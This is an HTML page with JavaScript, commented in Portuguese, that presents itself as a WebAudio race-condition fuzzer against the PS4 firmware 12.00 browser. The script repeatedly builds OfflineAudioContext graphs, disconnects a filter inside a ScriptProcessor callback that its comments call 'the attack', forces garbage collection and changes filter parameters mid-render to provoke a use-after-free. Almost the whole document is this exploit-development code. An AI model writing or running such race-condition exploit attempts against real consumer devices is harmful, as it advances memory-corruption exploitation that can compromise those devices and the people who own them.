<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 WebAudio Race (UAF)</title>
    <style>
        body { background-color: #0d0d0d; color: #ff3333; font-family: monospace; padding: 20px; }
        button { font-size: 20px; padding: 15px; background: #333; color: white; border: 1px solid #ff3333; cursor: pointer; }
        #status { margin-top: 20px; border: 1px solid #333; padding: 10px; }
    </style>
</head>
<body>
    <h1>WebAudio Race Condition Fuzzer</h1>
    <p>Targeting: AudioRenderThread (High Severity)</p>
    
    <button onclick="startAudioRace()">INICIAR FUZZING DE ÁUDIO</button>
    
    <div id="status">Status: Aguardando...</div>

    <script>
        function log(msg) { document.getElementById('status').innerText = msg; }

        function startAudioRace() {
            log("Inicializando OfflineAudioContext...");

            // Tenta rodar 50 tentativas de conflito
            let attempts = 0;
            const maxAttempts = 50;

            function runCycle() {
                attempts++;
                if(attempts > maxAttempts) {
                    log("Teste finalizado. O navegador sobreviveu (Sem UAF óbvio).");
                    return;
                }
                
                log(`Tentativa ${attempts}/${maxAttempts} - Criando Grafo de Áudio...`);

                try {
                    // 1. Cria um contexto offline (renderiza o áudio na memória, super rápido)
                    // Isso estressa a CPU mais que o áudio normal
                    const ctx = new OfflineAudioContext(1, 44100 * 0.1, 44100); // 0.1 segundos buffer

                    // 2. Cria nós de processamento
                    const osc = ctx.createOscillator();
                    const filter = ctx.createBiquadFilter();
                    const scriptNode = ctx.createScriptProcessor(4096, 1, 1);

                    // 3. Conecta tudo
                    osc.connect(filter);
                    filter.connect(scriptNode);
                    scriptNode.connect(ctx.destination);

                    osc.start(0);

                    // 4. O Ataque: Callback malicioso
                    // Quando o processador pede áudio, nós tentamos destruir o filtro
                    scriptNode.onaudioprocess = function(e) {
                        // Tenta desconectar e modificar propriedades durante o processamento
                        // Isso pode causar leitura de memória inválida na thread de áudio
                        filter.disconnect();
                        
                        // Alocação de lixo para forçar o Garbage Collector
                        let junk = new Float32Array(10000); 
                        junk.fill(Math.random());
                    };

                    // 5. Inicia a renderização
                    ctx.startRendering().then(() => {
                        // Se completou sem crash, tenta de novo
                        setTimeout(runCycle, 100);
                    }).catch((err) => {
                        // Erro normal de JS não é crash
                        console.log(err);
                        runCycle();
                    });

                    // 6. Interferência Externa (Race Condition)
                    // Tenta alterar parâmetros do filtro ENQUANTO ele está renderizando
                    setTimeout(() => {
                        try {
                            filter.frequency.value = 1000;
                            filter.Q.value = 20;
                            // Se o objeto já foi liberado na thread de áudio, isso causa Panic
                        } catch(e) {}
                    }, 5); // Timing crítico

                } catch (e) {
                    log("Erro JS: " + e.message);
                }
            }

            runCycle();
        }
    </script>
</body>
</html>
